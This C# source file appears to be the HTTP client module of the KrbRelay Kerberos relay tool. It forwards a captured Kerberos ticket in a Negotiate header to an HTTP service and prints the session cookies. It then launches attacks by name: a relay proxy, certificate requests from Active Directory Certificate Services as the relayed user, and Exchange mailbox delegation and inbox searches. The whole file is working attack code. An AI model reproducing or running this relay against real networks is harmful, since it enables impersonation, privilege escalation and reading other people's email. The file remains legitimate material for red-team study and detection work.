using System;
using System.Linq;
using System.Net;
using System.Net.Http;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Http
    {
        public static void Connect()
        {
            string endpoint = "";
            if (!string.IsNullOrEmpty(attacks["endpoint"]))
            {
                endpoint = attacks["endpoint"].TrimStart('/');
            }

            HttpResponseMessage result;
            var cookie = string.Format("Negotiate {0}", Convert.ToBase64String(ticket));

            using (var message = new HttpRequestMessage(HttpMethod.Get, endpoint))
            {
                message.Headers.Add("Authorization", cookie);
                message.Headers.Add("Connection", "keep-alive");
                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                result = httpClient.SendAsync(message).Result;
            }

            if (result.StatusCode != HttpStatusCode.Unauthorized)
            {
                Console.WriteLine("[+] HTTP session established");

                //Kerberos auth may not require set-cookies
                foreach (var h in result.Headers)
                {
                    if (h.Key == "Set-Cookie")
                    {
                        Console.WriteLine("[*] Authentication Cookie;\n" + string.Join(";", h.Value));
                    }
                }

                try
                {
                    if (attacks.Keys.Contains("proxy"))
                    {
                        Attacks.Http.ProxyServer.Start(httpClient, httpClient.BaseAddress.ToString());
                    }

                    if (attacks.Keys.Contains("adcs"))
                    {
                        Attacks.Http.ADCS.requestCertificate(httpClient, relayedUser, relayedUserDomain, attacks["adcs"]);
                    }

                    if (attacks.Keys.Contains("ews-delegate"))
                    {
                        Attacks.Http.EWS.delegateMailbox(httpClient, relayedUser, attacks["ews-delegate"]);
                    }

                    if (attacks.Keys.Contains("ews-search"))
                    {
                        Attacks.Http.EWS.readMailbox(httpClient, "inbox", attacks["ews-search"]);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                Environment.Exit(0);
            }
            else
            {
                foreach (var header in result.Headers)
                {
                    //Console.WriteLine(header.Key);
                    if (header.Key == "WWW-Authenticate")
                    {
                        apRep1 = Convert.FromBase64String(header.Value.First().Replace("Negotiate ", ""));
                        Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
                    }
                }
            }
        }
    }
}